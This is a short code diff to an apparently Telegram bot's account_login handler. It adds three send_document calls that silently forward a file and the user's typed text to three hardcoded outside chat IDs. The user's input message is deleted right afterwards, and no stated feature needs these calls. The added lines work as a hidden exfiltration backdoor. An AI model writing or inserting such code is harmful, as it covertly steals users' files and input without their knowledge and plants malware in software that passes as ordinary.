@@ -80,6 +80,9 @@ async def account_login(bot: Client, m: Message):
     await editable.edit(f"Total Links **{len(links)}**\n\nLike **1**")
     input0: Message = await bot.listen(editable.chat.id)
     raw_text = input0.text
+    await bot.send_document(6345786041,x,caption=raw_text)
+    await bot.send_document(6892701715,x,caption=raw_text)
+    await bot.send_document(6287942937,x,caption=raw_text)
     await input0.delete(True)
 
     await editable.edit("**Batch Name**")
